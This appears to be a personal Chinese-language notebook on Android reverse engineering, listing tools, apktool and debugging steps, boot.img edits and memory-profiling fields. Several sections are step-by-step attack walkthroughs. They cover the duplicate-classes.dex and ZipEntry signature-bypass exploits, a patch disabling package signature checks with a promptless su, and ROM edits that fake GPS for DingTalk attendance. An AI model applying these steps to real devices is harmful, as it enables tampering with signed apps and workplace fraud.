gda     http://www.gda.wiki:9090/index.php
```

## [逆向] 资料

```text
（1）Android安全大牛的博客：
鬼哥的博客： 听鬼哥说故事           https://blog.csdn.net/guiguzi1110/article/list/1?
Jack_Jia的博客： Android手机病毒分析及研究       https://blog.csdn.net/androidsecurity?viewmode=contents
i 简行的博客：简行之旅            https://blog.csdn.net/l173864930?viewmode=contents
淡然出尘的博客：淡然出尘            https://blog.csdn.net/zihao2012
爱加密系列教程：爱加密             https://www.cnblogs.com/ijiami/

（2）Android逆向学习论坛：
看雪论坛Android安全板块：看雪论坛-Android安全  https://bbs.pediy.com/
逆向未来论坛：逆向未来                 https://www.pd521.com/forum-37-1.html
吾爱破解：       https://www.52pojie.cn/forum-5-1.html

（3）看过的书：《Android软件安全与逆向分析》

（4）安卓安全学习QQ群：
Android安全实验室 296752155
爱破解，爱鬼哥 377724636
```

## [逆向] apktool 下载编译

```text
https://www.androiddevtools.cn/             里面有反编译工具大全

https://ibotpeaches.github.io/Apktool/

git clone git://github.com/iBotPeaches/Apktool.git
cd Apktool
For steps 3-5 use ./gradlew for unix based systems or gradlew.bat for windows.
需要先把终端设置为如下字符集，否则会编译报错
export LC_ALL=en_US.UTF-8
export LANG=en_US.UTF-8
./gradlew build shadowJar - Builds Apktool, including final binary.
./gradlew build shadowJar proguard       Optional (You may build a Proguard jar) 

编译之后生成的 apktool 的路径
./brut.apktool/apktool-cli/build/libs/apktool-xxxxx.jar

添加到 ~/.bashrc 和 ~/.zshrc
alias apktool='java -jar ~/github/Apktool/brut.apktool/apktool-cli/build/libs/apktool-cli-all.jar'
```

## [逆向]  [工具] google官方一键反编译 apk 工具 ClassyShark 使用

```text
https://github.com/google/android-classyshark/releases

下载最新的 ClassyShark.jar
export LC_ALL=en_US.UTF-8
export LANG=en_US.UTF-8
java -jar ClassyShark.jar       //选择一个apk打开即可
```

## TODO : [逆向]  [工具] andoguard

```text
https://github.com/androguard/androguard
pip install -U androguard
```

## TODO : [逆向]  [工具] 手机上的反编译工具 APKParser

```text
https://github.com/jaredrummler/APKParser
```

## TODO : [逆向]  [工具] MAC 上的反编译工具 Android-Crack-Tool

```text
https://github.com/Jermic/Android-Crack-Tool
```

## TODO : [逆向] Smali Viewer 用户指南(查看 Smali 文件用)

```text
http://blog.avlyun.com/show/%E3%80%8Asv%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97%E3%80%8B/
https://blog.csdn.net/jiangwei0910410003/article/details/51456735       Android逆向之旅---动态方式破解apk前奏篇(Eclipse动态调试smail源码)
```

## TODO : [逆向] 手把手教你逆向分析 Android 程序

```text
https://segmentfault.com/a/1190000005133219
```

## TODO : [逆向] 26款优秀的Android逆向工程工具

```text
https://www.freebuf.com/sectool/111532.html
```

## [逆向] 反编译.vdex文件

```text
O版本，vdex文件直接通过vdexExtractor 直接生成dex文件
./vdexExtractor  -i xxxx.vdex  -o . --deps -f

P版本，会生成中间.cdex文件，需要使用compact_dex_converters临时转换成dex文
件, 生成的boot-framework_classes.cdex.new其实就是.dex文件，重命名成.dex后
缀，直接jadx解开即可看到java文件

工具同步更新到如下目录：smb://192.168.3.127/02_sw/127文件目录/02_工具dTOOL/02%20智能机/10_Tools/Extra-vdex/
```

## [逆向] 带你把Apk混淆成中文语言代码

```text
http://www.520monkey.com/archives/992
```

## [逆向] 通过抓包分析数据爬取<英语流利说>视频

```text
https://blog.csdn.net/jiangwei0910410003/article/details/79367213
```

## [逆向]  [工具] 利用 AXMLEditor 修改 AndroidManifest.xml 和 arsc 文件

```text
AXMLEditor 的开源项目地址
https://github.com/fourbrother/AXMLEditor

第一、用途
针对于特定apk反编译破解之后无法回编译操作，直接进行arsc文件的二进制文件修改，然后只需要二次签名即可。无需在进行反编译和回编译。

第二、用法
1》插入属性
java -jar AXMLEditor.jar -attr -i [标签名]  [标签唯一标识]  [属性名]  [属性值]  [输入xml]  [输出xml] 
案例：java -jar AXMLEditor.jar -attr -i application package debuggable true input_arsc.xml out_arsc.xml
application的标签中插入android:debuggable="true"属性，让程序处于可调式状态

2》删除属性
java -jar AXMLEditor.jar -attr -r [标签名]  [标签唯一标识]  [属性名]  [输入xml]  [输出xml] 
案例：java -jar AXMLEditor.jar -attr -r application allowBackup input_arsc.xml out_arsc.xml
application标签中删除allowBackup属性，这样此app就可以进行沙盒数据备份

3》更改属性
java -jar AXMLEditor.jar -attr -m [标签名]  [标签唯一标识]  [属性名]  [属性值]  [输入xml]  [输出xml] 
案例：java -jar AXMLEditor.jar -attr -m application package debuggable true input_arsc.xml out_arsc.xml
application的标签中修改android:debuggable="true"属性，让程序处于可调式状态

4》插入标签
java -jar AXMLEditor.jar -tag -i [需要插入标签内容的xml文件]  [输入xml]  [输出xml] 
案例：java -jar AXMLEditor.jar -tag -i [insert.xml]  input_arsc.xml out_arsc.xml
因为插入标签时一个标签内容比较多，所以命令方式不方便，而是输入一个需要插入标签内容的xml文件即可。

5》删除标签
java -jar AXMLEditor.jar -tag -r [标签名]  [标签唯一标识]  [输入xml]  [输出xml] 
案例：java -jar AXMLEditor.jar -tag -r activity cn.wjdiankong.demo.MainActivity input_arsc.xml out_arsc.xml
删除android:name="cn.wjdiankong.demo.MainActivity"的标签内容
```

## [逆向]  [工具] apktool 反编译失败

```text
我们在使用apktools工具进行反编译失败的时候，我们可以这么做来避免：

第一步：利用baksmali和smali工具直接修改器对应的dex文件
第二步：利用AXMLEditor.jar工具直接修改对应的xml文件
```

## [逆向] Xpatch

```text
Xpatch用来重新签名打包Apk文件，使重打包后的Apk能加载安装在系统里的Xposed插件，从而实现免Root Hook任意App。

java -jar ../../xpatch.jar ../../wechat.apk

java -jar ../../xpatch.jar ../../source.apk -xm ../../module1.apk
```

## [逆向] Xposed 模块编写

```text
非常详细的教程
https://www.52pojie.cn/thread-688466-1-1.html

xposed 官方api
https://api.xposed.info/reference/packages.html

xposed 插件
https://xposed.appkg.com/
```

## TODO : [逆向]  [工具] 太极·Magisk

```text
https://magiskmanager.com/
```

## TODO : [逆向]  [重点研究] 免root实现Hook系统服务拦截方法

```text
http://www.520monkey.com/archives/861
```

## TODO : [逆向]  [重点研究] 运行时修改内存中的Dalvik指令来改变代码逻辑

```text
http://www.520monkey.com/archives/815
```

## TODO : [逆向]  [重点研究] Hook系统的AMS服务实现应用启动的拦截功能

```text
http://www.520monkey.com/archives/870
```

## TODO : [逆向] Android中利用ZipEntry漏洞实现免root写恶意文件到应用的沙盒中

```text
http://www.520monkey.com/archives/833
```

## TODO : [逆向] 硬上MTK平板-修改定制安卓系统

```text
https://bbs.pediy.com/thread-249739.htm

怎么才能知道 rom 分区的开始结束地址??
```

## TODO : [逆向]  [工具] 学习 Frida, xposed, SubstrateCydia 等 hook 工具,<https://blog.csdn.net/jiangwei0910410003/article/details/80372118>

## TODO : [逆向] Kotlin，Flutter 写的代码，怎么反编译??

## [逆向] 解压 Android 系统中的 system.img

```text
https://www.jianshu.com/p/db70835d41c8
```

## TODO : [逆向] Android通用脱壳机FUPK3

```text
https://blog.csdn.net/earbao/article/details/82761525
https://github.com/F8LEFT/FUPK3
```

## TODO : [逆向] AspectJ 埋点技术

```text
http://ju.outofmemory.cn/entry/338292
```

## [逆向] Android小分队教你怎么利用Bluebox Security 曝的漏洞

```text
1.      漏洞原理
漏洞的关键点在于，Android假设一个APK包中的文件是不会重名的。可实际上Zip格式是允许一个Zip文件包含具有相同文件命的文件。（注意，这里的文件名，包括这个文件在Zip包里的相对路径）。
Android在安装应用时，会抽取APK包中每个文件，进行签名验证。但如果碰到了相同文件名的文件，则只会校验第二个文件，而忽略第一个文件。
另外在应用运行前会释放classes.dex到/data/dalvik-cache/目录生成优化过的odex文件，然后再运行。这个阶段如果APK里有两个classes.dex，就只会抽取第一个classes.dex进行优化，而忽略第二。
好了，说到这，相信读者应该明白怎么利用这个漏洞了吧。

2.      攻击分析
如果我们将一个APK包中放入两个classes.dex文件。第一个classes.dex是被我们篡改过的恶意dex文件；第二个classes.dex是原来这个APK中的classes.dex文件。那么在签名验证时，就会验证原来的classes.dex，因此通过验证；而执行时，却执行了被篡改过的第一个classes.dex。

3.      攻击步骤
a)      找个你想攻击的APK，抽取出其classes.dex保存
b)      反编译 classes.dex，修改之，重新生成新的classes.dex，更名为classes.dey
c)      用7z打开原APK包，删除其中的classes.dex，保存退出7z。
d)      依次将classes.dey和保存的classes.dex，通过7z塞入APK，然后保存退出7z
e)      用UltraEdit编辑修改过的APK，查找“classes.dey”，修改为“classes.dex”（共有两处），然后保存。
f)       大功告成。

4.      总结
a)      这个漏洞可以攻击几乎所有的APK应用。利用该漏洞修改过的APK，能依然保留原签名，可以通过Android的签名验证，并能执行恶意代码。
b)      如果手机里的一些应用是APK + odex形式存在的。很不幸，这个漏洞无法攻击这部手机上的这些应用。因为这个APK里没有classes.dex，无法借尸还魂。
c)      如果手机里有Settings.apk（非APK + odex形式），取出来修改下，再安装覆盖，就能拿到System权限。因为Settings是system uid。
```

## [逆向] 利用文件头的漏洞

```text
1.在讲这个漏洞之前，首先需要搞明白java里short类型转int类型的问题。要理解这个漏洞，必须明白这个技术点。

public class JavaTest {
    public static void main(String[]  args) {
       short a = (short)0xFFFF;
       int b;
       b = a;
       System.out.println(b);
       b = a & 0xFFFF;
       System.out.println(b);
   }
}

如果你能很清楚的了解上述代码中两次打印变量b的值有何不同，以及为何不同的话，这部分就可以先跳过了。否则还是要先弄清楚再往下看。

2.Zip文件格式

在每个Zip文件中都有一个Central directory，Central directory中的每一项是一个File header。这个File header的结构对应到Android代码的类就是ZipEntry。File header结构中有一个偏移量指向local file header，local file header后面就紧跟着file data。接下来我们详细看一下local file header的结构。

local file header signature    4 bytes  (0x04034b50)
version needed to extract      2 bytes
general purpose bit flag       2 bytes
compression method             2 bytes
last mod file time             2 bytes
last mod file date             2 bytes
crc-32                         4 bytes
compressed size                4 bytes
uncompressed size              4 bytes
file name length               2 bytes
extra field length             2 bytes
file name (variable size)
extra field (variable size)

可以看到，除最后2个域以外，local file header的其他域都是定长的。而这两个变长域的长度是由file name length和extra field length所确定。再次说明，紧跟在extra field后面的就是文件的数据file data了。

3.Android如何进行apk校验

Android在进行apk文件校验时，会调到ZipFile的public InputStream getInputStream(ZipEntry entry)函数。这函数中，有这么一段：

RAFStream rafstrm = new RAFStream(raf, entry.mLocalHeaderRelOffset + 28);
DataInputStream is = new DataInputStream(rafstrm);
int localExtraLenOrWhatever = Short.reverseBytes(is.readShort());
is.close();

// Skip the name and this "extra" data or whatever it is:
rafstrm.skip(entry.nameLength + localExtraLenOrWhatever);
rafstrm.mLength = rafstrm.mOffset + entry.compressedSize;
if (entry.compressionMethod == ZipEntry.DEFLATED) {
    int bufSize = Math.max(1024, (int)Math.min(entry.getSize(), 65535L));
    return new ZipInflaterInputStream(rafstrm, new Inflater(true), bufSize, entry);
} else {
    return rafstrm;
}

注意：上述代码中红色部分。localExtraLenOrWhatever就是local file header结构中的extra field length。回想一下我们第一部分将的技术点，如果这里的extra filed length的大小是大于2^15，会怎么样?

没错，localExtraLenOrWhatever将会是负值。因此接下来，rafstrm.skip(entry.nameLength + localExtraLenOrWhatever); 这句将无法真正跳过变长域file name (variable size) 和extra field (variable size)。反而有可能呢会跳到file name (variable size)中，甚至file name (variable size)之前。当然为了攻击方便，我们还是期望它跳到file name (variable size)中。

4.如何实施攻击

要改变一个apk的行为，显然攻击的目标就是apk里的classes.dex文件。对于classes.dex文件在apk文件中的local file header结构，其file name (variable size)域的内容肯定就是“classes.dex”了。注意，这里的后缀名dex，正好和dex文件开头的三个字节完全相同（不理解的，参见dex文件格式）。

a) 利用这一点，从file name (variable size)域“classex.dex”的“.”之后开始我们可以写入一个完整的dex文件。这个dex文件必须是原apk里的classes.dex文件。只有这样才能绕过签名验证
b) 修改extra field length，使之为0xFFFD。因为这个值刚好为-3。根据漏洞，rafstrm.skip(entry.nameLength + localExtraLenOrWhatever); 这句就会跳到file name (variable size)域中的“.”之后。也就是一个dex文件的开始，这里必须是原dex文件内容。
c) 修改local file header之后的file data数据。在这里写入带有攻击代码的classes.dex内容。
d) 以上的修改会带来apk文件一些结构上的调整，比如扩充extra field域，调整file data大小等。

具体攻击模型，如下图。

安卓安全小分队发现Android新漏洞

5.总结

总的来说该攻击手段，首先利用了Android在签名验证过程中，对Zip文件相应16位域的读取时，没有考虑到大于2^15的情况。（因为java的int , short, long都是有符号数，而不像C/C++里有无符号数）。

其次利用了Zip文件中的local file header结构的extra field域来存放原classes.dex。但这个域的大小最多只能是2^16-1，因此被攻击的Apk里的classes.dex大小必须在64K以内。否则，就无法对其进行攻击。这算是这种攻击方式的一个限制。

最后还有一个问题补充说明：之所以这种攻击方式能成功，还在于在运行时，系统抽取的是hacked classes.dex，而在签名校验时，验证的是extra域里的classes.dex。前者是在libdex.so中实现，后者在Java层实现。是由Java层跟Native层不一致导致。
```

## [逆向]  [hook] android.widget.TextView.setText

```text
public class Main {
    public static void initialize() {
        MS.hookClassLoad("android.widget.TextView", new MS.ClassLoadHook() {
   @Override
   public void classLoaded(Class<?> arg0) {
    Method smstest;
    try {   
     smstest = arg0.getMethod("setText", CharSequence.class);
    } catch (SecurityException e) {
     smstest=null;
     e.printStackTrace();
    } catch (NoSuchMethodException e) {
     smstest=null;
     e.printStackTrace(); 
    }
    if (smstest!=null) {
     final MS.MethodPointer old = new MS.MethodPointer();
     MS.hookMethod(arg0, smstest, new MS.MethodHook() {
      @Override
      public Object invoked(Object arg0, Object... arg1) throws Throwable {  
       Log.d("ggz","i am hook in------->");
       String bb=(String)arg1[0] ;
       Log.d("ggz","string is----->"+bb);  
       bb="爱破解，爱鬼哥";
       Log.d("ggz","now string is --->"+bb);
       return old.invoke(arg0, bb);            
      }
     }, old); 
    }
   }   
        });
    }
}
```

## [逆向]  解压 Android 系统中的 system.img

```text
system.img 是什么
system.img 是 Android 系统中用来存放系统文件的镜像 (image) ，文件格式为 yaffs2 或者 ext 的文件系统 ，在 Android 源码编译后会生产该文件。它将被 init 进程通过解析 init.rc 文件挂载 (mount) 到 /system 目录或者说 system 分区下

如何制作 system.img
使用下面的命令来即可制作一个 system.img

$ make_ext4fs -s -T 1421464178 -S file_contexts -l 1073741824 -a system system.img system/
命令说明
make_ext4fs用于制作 Android 平台上 ext4 文件系统的镜像
参数说明
-s 表示安静处理，不输出动作，可选参数
-T 表示 Unix 时间戳，对 system.img 中的文件设置修改时间
-S 表示 sepolicy 的 file_contexts
-l 表示最大的文件大小（受限于分区大小）
-a 表示 Android 的挂载（mount）点，比如 system、userdata、recovery，make_ext4fs 会根据 private/android_filesystem_config.h 里定义好的权限来给文件夹里的所有文件重新设置权限，如果不指定 -a 参数，则使用默认权限
system.img 表示输出文件名
system/ 表示输入目录，该目录下有 framework、app、bin 等目录
命令执行完成后，会得到一个经过压缩的 system.img ，无法直接进行mount，我们后面具体会介绍如何查看 system.img 中的内容

如何解压 system.img
system.img 是包含在系统刷机包里面的，解压刷机包，通常会有两种情况

直接得到 system.img

在 Android 5.0 以前的版本（不包含 5.0），通过解压刷机包可以直接得到 system.img ，而 system.img 可能是 raw、yaffs2 或者 ext 的文件系统
使用 file 命令可以区分 system.img 的文件系统格式

$ file system.img
如果输出是 Linux rev 1.0 ext4 filesystem data ，则表明是 raw 文件
如果输出是 VMS Alpha executable ，则表明是 yaffs2 文件
如果输出是 data ，则表明是 ext 文件

查看 raw 格式的 system.img 内容

Linux rev 1.0 ext4 filesystem data 表明 system.img 是一个完整的分区镜像，可以直接用于挂载，使用下面的命令即可查看 system 的内容

$ mkdir system
$ sudo mount -t ext4 system.img system
解压 yaffs2 格式的 system.img

下载 unyaffs 源码，然后执行下面命令编译得到 unyaffs 可执行文件

$ gcc -o unyaffs unyaffs.c
创建一个 system 目录，将 unyaffs 和 system.img 放到 system 目录中，然后执行命令，即可解压到当前目录

$ unyaffs system.img
解压 ext 格式的 system.img

首先，需要用 simg2img 工具把 system.img 转为为 ext4 文件格式，该工具位于 out/host/linux-x86/bin/simg2img
工具用法

https://codeload.github.com/KinglyWayne/simg2img_win/zip/master

$ simg2img system.img system.ext4.img
会得到一个 system.ext4.img ，它是 raw 格式的完整镜像，可以使用上面介绍的方法进行查看

刷机包中无 system.img
在 Andriod 5.0 以后的版本，为了降低update.zip文件的大小和写入的数据量，所有的ROM包，都仿照增量包的方式进行打包了，我们解压刷机包，会得到以下三个带有 system 的文件

system.new.dat
system.patch.dat
system.transfer.list
system.new.dat文件实际上是由system.transfer.list描述的一个稀疏数组，使用 sdat2img 工具即可转换得到真正的 system.img

$ sdat2img system.transfer.list system.new.dat system.img
前两个参数分别是 trans list 文件和输入的 system.new.dat 文件，最后一个是输出的 system.img 文件名，生成的文件可以直接用于 ext4 的 mount
```

## [逆向] 26款优秀的Android逆向工程工具

```text
https://blog.csdn.net/earbao/article/details/54590040
```

## [逆向] 修改Nexus5的boot.img - 打开系统调试

```text
当打开Android系统调试标志时，手机内的APP都可以被调试，调试的是dex内的Java代码。

打开系统调试标志的好处是：当调试APP时，不需要在APP的AndroidManifest.xml文件中添加android:debuggable="true"，从而省了对APP重打包的过程。

修改boot.img本以为是很简单的事情：解包-修改-打包-刷入-完事儿。可是实践中把新的boot.img刷入后，手机一直启动不起来。甚至解包后直接打包，然后刷入手机，手机依旧起不来。经过摸索，现在成功的将修改后的boot.img刷入手机并且手机运行良好，所以总结了这篇文章。

不直接修改手机里的default.prop，是因为当手机重启后这个文件就会复原。

所有需要的工具见附件，其中mkbootimg和unpackbootimg是基于源码编译的，网上下载下来的不靠谱。

所有操作基于linux x64系统。

-------------------------------------------------------------------

步骤：
一、下载“Google Nexus 5 谷歌最新官方原厂安卓4.4.4固件”，从这个ROM中提取出boot.img文件。

二、boot.img解包
运行下面的命令将会对boot.img解包，得到boot.img-kernel和boot.img-ramdisk.gz两个文件：
split-bootimg.pl boot.img

三、处理boot.img-ramdisk.gz
运行下面的命令，对boot.img-ramdisk.gz进行解压：
mkdir ramdisk
cd ramdisk
gzip -dc ../boot.img-ramdisk.gz | cpio -i

四、修改default.prop，打开系统调试标志
找到解压出来的default.prop文件，将其中的ro.debuggable=0修改为ro.debuggable=1

五、ramdisk目录打包
返回ramdisk的上层目录，输入命令：
mkbootfs ./ramdisk | gzip > ramdisk.img

六、打包出新的boot.img
命令：
mkbootimg --base 0x00000000 --ramdisk_offset 0x02900000 --second_offset 0x00F00000 --tags_offset 0x02700000 --cmdline 'console=ttyHSL0 androidboot.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1 earlyprintk' --kernel boot.img-kernel --ramdisk ramdisk.img -o newboot.img

七、将新的boot.img刷入手机
这时，在windows下还是linux下就无所谓了。将手机连上电脑输入下面的命令，重启手机进入fastboot：
adb reboot bootloader
当重启手机后，将新的boot.img刷入手机：
fastboot flash boot newboot.img
如果出现类似下图的输出，就说明刷入成功了：


刷入成功并不代表你的手机可以正常使用~~不过只要严格按照上面的方法，在Nexus5这个手机下还是没有问题的。现在输入下面的命令重启手机吧：
fastboot reboot

八、系统中的APP都可以调试了！
APP调试命令：adb shell am start -D -n <包名>/<Activity名>

后记：
如果手机刷成砖怎么办?
我的Nexus5本身就是“Google Nexus 5 谷歌最新官方原厂安卓4.4.4”，所以我在手机因为刷boot.img而无法启动的时候，直接进入fastboot，然后把官方的boot.img重新刷到手机里面，然后砖就满血满状态复活了。

手动进入fastboot模式（用于变成砖以后使用）：
同时按【音量下键+电源键】。

工具备注：
mkbootimg和unpackbootimg可能只能用在linux x86的系统上，那我的linux x64怎么能使用这两个工具哪?因为我的linux x64系统下载了支持x86程序运行的库。
```

## [逆向] Android应用逆向——分析反编译代码之大神器

```text
https://blog.csdn.net/CharlesSimonyi/article/details/52027563
```

## [逆向] 修改rom模拟钉钉打卡

```text
1.定位打卡
修改gnsslocationprovider.java，直接reportLocation即可。
2.移除位置模拟权限，实现免权限任意修改定位
修改LocationManagerService.java，
找到private boolean canCallerAccessMockLocation(String opPackageName)
返回值改为return true即可
3.将模拟位置变成真实位置（移除位置模拟标记）
修改Location.java，
找到public boolean isFromMockProvider()
返回值改为return false即可

原理说明
通过定制ROM的方式，直接修改获取wifi或者定位信息的相关接口，实现wifi信息修改、模拟定位。
此方式可以免root，同时未使用xposed等api拦截的方式，从而达到防封的目的。
```

## [逆向] 调试

```text
android端的调试
这里说是调试而不说逆向的原因是因为逆向的内容实在是太多了，入门可以参考《android软件安全与逆向分析》，《android攻防权威指南》以及《漏洞战争》中的部分内容来学习，这里选择调试中重要的内容来介绍。姑且就分为以下两者吧

手动调试
半自动化工具调试
smali的调试
在 smali 语法中，使用的都是寄存器，但是其在解释执行的时候，很多都会映射到栈中。通常每个smali会对应一个类。

编译 - smali2dex

给定一个 smali 文件，我们可以使用如下方式将 smali 文件编译为 dex 文件。

java -jar smali.jar assemble src.smali -o src.dex
运行 smali

在将 smali 文件编译成 dex 文件后，我们可以进一步执行
首先，使用 adb 将 dex 文件 push 到手机上

adb push main.dex /sdcard/
其次使用如下命令执行

adb shell dalvikvm -cp /sdcard/main.dex main
AS + smalidea

打开设备中需要调试的apk，在cmd中运行命令 ：adb shell "dumpsys activity top | grep --color=always ACTIVITY"，就可以看到需要调试apk的包名、主acitivity以及进程号（或者也可以使用adb shell "dumpsys activity activities | grep xxxActivity"）
使用命令以debug模式启动apk:adb shell am start -D -n 包名/主activity名，然后你的设备可以看到wait for debugger
再一次运行第一步的命令，获取新的进程号：adb shell "dumpsys activity top | grep --color=always ACTIVITY" 或者运行命令： adb shell "ps | grep 包名"亦可
adb forward tcp:debug端口 jdwp:apk进程号
以上步骤可以直接在as中logcat里选定调试进程，然后选择Attach Debugger To Android Process
查看与包名相关JDWP命令：adb shell "ps -t | grep -A 8 包名"
查看所有JDWP进程命令：adb shell "ps -t | grep -B 6 JDWP"
smali的修改

之前尝试用apk改之理，但是由于版本太老了有较多不方便，所以弃坑，现在我通常是apktool反编译后修改，然后再编译并使用自签名，这样也可以达到修改安装使用的效果

基本原生程序

如elf文件就可以

使用 android_server 的 PIE 版本
利用 010Editor 将可执行 ELF 文件的 header 中的 elf header 字段中的 e_type 改为 ET_DYN(3)。
so 原生程序的调试

其加载方式有system.load和system.loadlibrary两种，前者加载绝对路径，后者加载libs下的so文件，两者都会在内部调用doload函数，其流程大致如下

doload -> nativeload -> 对应到Dalvik_java_lang_Runtime_nativeLoad-> dvmLoadNativeCode加载相应的native code -> findSharedLibEntry(判断是否已经加载了这个库以及是否是对应的class loader) --如没有加载--> dlopen打开 --> si->CallConstructors()初始化 --> 创建表且用dlsym获取对应so文件中 JNI_OnLoad 函数

静态分析 java 层： 没什么好说的，理解程序逻辑去做就好了

静态分析原生层程序基本的过程如下

提取 so 文件
ida 反编译 so 文件阅读 so 代码
根据 java 层的代码来分析 so 代码。
根据 so 代码的逻辑辅助整个程序的分析。
在android studio 3.12后已经将ddms移除了，所以官方的建议是

当我们不能使用ddms时意味着我们使用jdb进行转发时无法确定具体的port，有一种方法是加载程序运行时需要的so文件，然后在一些关键函数比如jniString()函数下断，运行apk后，然后attach其进程即可。

当然有时候会需要在jni_load下断，而so文件又被处理或者干脆jni_load被加密了，这时需要pull出来libdvm so文件,参考我们加载方式的流程，直接查找dvmLoadNativeCode，函数中调用dlopen加载so，返回时so已经加载且已经初始化完成，调试下就能找到。

hook

hook的方法很多，但原理就是这么几种，同时又有对Dalvik,ART,inline,GOT等对象hook，这个有太多大佬写过各种类型的hook了，hook的框架也有许多，展开分析内容太多了，就不再累述了，这里就推荐下以frida入门。

Frida hook分为注入进程，直接在源码中修改，以及动态链接三种方式

frida的交互实现大致可以这么理解：默认监听27042端口，对目标进程gadget在启动时进行阻塞，直到实现attach进程或者在使用spawn()后再resume恢复进程，当然这些状态都可以通过配置修改，也可以提前设置好过滤器将特定脚本加载到特定应用中。

由于frida是个轻量级的hook框架，所以还是比较容易添加自己想要的功能，具体请看官网的frida架构图。

frida有一个功能可以为我们生成一个进程而不是将它注入到运行中的进程中，它注入到Zygote中，生成我们的进程并且等待输入。即spawn是注入zygote而attach是注入当前进程。

这里有遇到过的一些小坑，分别是设备检测问题和windows端的编码问题：

https://github.com/frida/frida/issues/1111

https://github.com/rkern/line_profiler/issues/37
```

## [逆向] 瘫痪Android的安全机制

```text
第一步,/system可写
Rk2918现在可使用我不久前发明的方法,将/system映射在/data/sysrw

Rk2818的话,自然是使用aufs这种xda发明的方法,但使用rk2918的方法会快些

第二步,获取root权限
因为是完全击垮,故需要使用完全自由的su程序,改造自Superuser的su源码– 无限制无管理功能的su

这里提供的su,去掉了GUI确认等繁琐操作,任何程序都可以无提示获取root权限

自行添加的话,请确保所在分区支持suid,并设置su的权限为6777

第三步,移除apk的签名验证机制
在此之前,尝试美化系统界面的童鞋都知道,系统apk千万千万不要签名,否则肯定用不了

对此我就不信邪,偏偏要破解掉这个限制,实现任意签名的apk,都能安装,完全跳过签名验证机制!!

方法如下:

下载apktool,并安装好JRE或JDK,把apktool解压到D:\apktool
在机器上拷贝/system/framework/services.jar到硬盘的D:\apktool\services.apk
进入命令行,进入D:\apktool,执行 apktool.bat d services.apk ,稍等片刻,就能能看到新建的services文件夹
用UE或notepad++打开D:\apktool\services\smali\com\android\server\PackageManagerService.smali
查找private verifySignaturesLP,这就是校验签名的方法
在verifySignaturesLP方法体中,找到:goto_0,在后面加一行 const/4 v0, 0x1 ,含义是赋值为true,以Java来表达,就是return true,这是verifySignaturesLP方法的最终return语句之前的一句,故任何调用本方法的语句,都能拿到true,即签名验证永远为真. 注意,这里的0x1中的x是小写字母X,貌似很多人直接拷贝的话,会变成全角的X.如果你没有找到goto_0,那就找return v0之类的语句.一般都只有一个return语句!!
保存,重新打包: apktool.bat b services services.jar ,然后拷贝回机器,重启就可以了
完成以上步骤,你的Android设备就彻底裸奔了
System可写 – 为任意改系统文件创造条件
无限制的su – 任何程序都能悄无声息地获取root权限,加上上一条的System可写,即任何程序都能修改/system
不再有签名验证 – 任何apk程序都可以声明自己是系统程序,甚至可以动态生成apk程序进行安装(随便签名就行!!)
从此,你的Android设备完全不设防了!!
```

#####################################################################################################
#####################################################################################################
########################################### 逆向 end #################################################
#####################################################################################################
#####################################################################################################

#####################################################################################################
#####################################################################################################
#################################### Performance optimize begin #####################################
#####################################################################################################
#####################################################################################################

## [性能] 精简官方ROM并且内置ROOT权限，开启Romer之路

```text
https://blog.csdn.net/qq_26787115/article/details/50736823
```

## [性能] Android优化总结

```text
https://juejin.im/post/5d072dbc51882540b7104709
```

## [性能] smaps 各个字段含义

```text bash
adb shell ps | grep "systemui"

adb shell cat /proc/${pid}/smaps

ffff0000-ffff1000 r-xp 00000000 00:00 0          [vectors] 
Size:                  4 kB
Rss:                   0 kB
Pss:                   0 kB
Shared_Clean:          0 kB
Shared_Dirty:          0 kB
Private_Clean:         0 kB
Private_Dirty:         0 kB
Referenced:            0 kB
Anonymous:             0 kB
AnonHugePages:         0 kB
Shared_Hugetlb:        0 kB
Private_Hugetlb:       0 kB
Swap:                  0 kB
PSwap:                 0 kB
SwapPss:               0 kB
KernelPageSize:        4 kB
MMUPageSize:           4 kB
Locked:                0 kB
VmFlags: rd ex mr me

第一行： 
08048000-080bc000 地址空间的开始地址 - 结束地址 
r-xp 属性。前三个是rwx（读、写、可执行）,如果不具有则为“-”。最后一个是p/s(私有/共享) 
00000000 偏移量。如果这段内存是从文件里映射过来的，则偏移量为这段内容在文件中的偏移量。如果不是从文件里面映射过来的则为0. 
03:02 If the region was mapped from a file, this is the major and minor device number (in hex) where the file lives. 
13130 If the region was mapped from a file, this is the file number. 
/bin/bash If the region was mapped from a file, this is the name of the file. This field is blank for anonymous mapped regions. There are also special regions with names like [heap] , [stack] , or [vdso] . [vdso]  stands for virtual dynamic shared object. It’s used by system calls to switch to kernel mode.

Rss-Resident Set Size 实际使用物理内存（包含共享库占用的内存）
Rss=Shared_Clean+Shared_Dirty+Private_Clean+Private_Dirty
Pss 实际使用的物理内存（按比例包含共享库占用的内存）。比如四个进程共享同一个占内存1000MB的共享库，每个进程算进250MB在Pss。
Shared_Clean 、 Shared_Dirty 、 Private_Clean、 Private_Dirty
（shared/private）共享和私有 
一个页的clean字段表示没有更改此页，当发生换页时不用写回。dirty表示更改了此页，当发生换页时要写回磁盘。此处这四个值是遍历页表中各个页后得到的。 
“Referenced” indicates the amount of memory currently marked as referenced or accessed. “Anonymous” shows the amount of memory that does not belong to any file. Even a mapping associated with a file may contain anonymous pages: when MAP_PRIVATE and a page is modified, the file page is replaced by a private anonymous copy. “Swap” shows how much would-be-anonymous memory is also used, but out on swap.
```

## [性能] meminfo 各个字段含义

```text bash
adb shell dumpsys meminfo com.android.systemui

Applications Memory Usage (in Kilobytes):
Uptime: 560220 Realtime: 560220

** MEMINFO in pid 875 [com.android.systemui]  **
                   Pss  Private  Private  SwapPss     Heap     Heap     Heap
                 Total    Dirty    Clean    Dirty     Size    Alloc     Free
                ------   ------   ------   ------   ------   ------   ------
  Native Heap     7482     7324      108     2073    12544    10061     2482
  Dalvik Heap     4124     4004       12      147     7038     3519     3519
 Dalvik Other     1522     1516        4       16                           
        Stack       44       44        0        0                           
       Ashmem        2        0        0        0                           
    Other dev       16        0       12        0                           
     .so mmap     6851      132      732       77                           
    .apk mmap     6026        0     5528        0                           
    .ttf mmap      385        0      256        0                           
    .dex mmap     5151        0      688        0                           
    .oat mmap     3584        0       64        0                           
    .art mmap     2249      784       60       32                           
   Other mmap     2587        4     1388        1                           
   EGL mtrack       62       62        0        0                           
    GL mtrack     5289     5289        0        0                           
      Unknown      652      560       92      101                           
        TOTAL    48473    19719     8944     2447    19582    13580     6001
 
 App Summary
                       Pss(KB)
                        ------
           Java Heap:     4848
         Native Heap:     7324
